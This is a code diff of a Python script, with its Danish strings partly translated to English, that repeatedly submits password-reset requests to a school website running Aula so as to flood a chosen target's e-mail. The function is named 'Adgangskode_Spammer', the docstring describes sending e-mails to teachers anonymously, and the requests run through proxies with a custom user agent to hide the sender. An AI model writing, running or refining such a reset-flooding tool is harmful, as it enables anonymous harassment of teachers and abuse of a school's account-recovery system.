@@ -5,7 +5,7 @@ from colorama import Fore
 """ Send e-mails til lære igennem specificeret skole-hjemmesider der bruger Aula, anonymt. """ 
 
 # CONSTANTS
-SKOLE = ''
+SCHOOL = ''
 EMAIL = ''
 
 # UTILITIES
@@ -26,20 +26,20 @@ def Adgangskode_Spammer():
     while True:
 
         res = requests.post(
-            f'{SKOLE}/user/password', headers=user_agent, proxies=proxies,
+            f'{SCHOOL}/user/password', headers=user_agent, proxies=proxies,
 
             data = {
-                'name'    : EMAIL, # E-mail af specificeret target.
+                'name'    : EMAIL,
                 'form_id' : 'user_pass', 
                 'op'      : 'Indsend'
             }
         )
 
         if 'Yderligere instruktioner' in res.text:
-            print(f"{EMAIL} {Fore.RED}::{Fore.RESET} Har fået en anmodning.")
+            print(f"{EMAIL} {Fore.RED}::{Fore.RESET} received e-mail.")
 
         else:
-            print("Fejl, enten kan personen ikke modtage flere status-koder ellers er E-mailen ikke tilmeldt Aula...")
+            print("Error (If the person isn't registered in Aula) / Done (If the person can't receive more password-resets) ...")
             return
 
           
